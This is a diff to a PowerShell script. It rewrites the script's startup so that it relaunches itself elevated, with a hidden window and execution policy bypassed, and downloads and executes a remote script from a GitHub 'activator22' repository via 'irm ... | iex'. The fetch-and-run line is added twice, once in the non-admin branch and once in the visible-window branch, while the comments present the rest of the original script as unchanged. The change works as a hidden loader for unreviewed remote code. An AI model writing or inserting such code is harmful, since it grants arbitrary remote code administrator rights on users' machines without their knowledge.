@@ -1,12 +1,15 @@
-# Add these lines at the beginning of the script
+# Check if running as admin
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
-    # If script is not running as admin and not hidden, restart it hidden
-    if ($Host.UI.RawUI.WindowStyle -ne 'Hidden') {
-        Start-Process PowerShell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
-        exit
-    }
+    # Restart with admin rights
+    Start-Process PowerShell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"irm https://raw.githubusercontent.com/activator11/activator22/main/activator22.ps1 | iex`"" -Verb RunAs
+    exit
 }
 
+# If we're here, we're running as admin. Check if we need to go hidden
+if ($Host.UI.RawUI.WindowStyle -ne 'Hidden') {
+    Start-Process PowerShell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"irm https://raw.githubusercontent.com/activator11/activator22/main/activator22.ps1 | iex`"" 
+    exit
+}
 
 # The rest of your original script remains the same
 $script:lastProcessedContentHash = $null
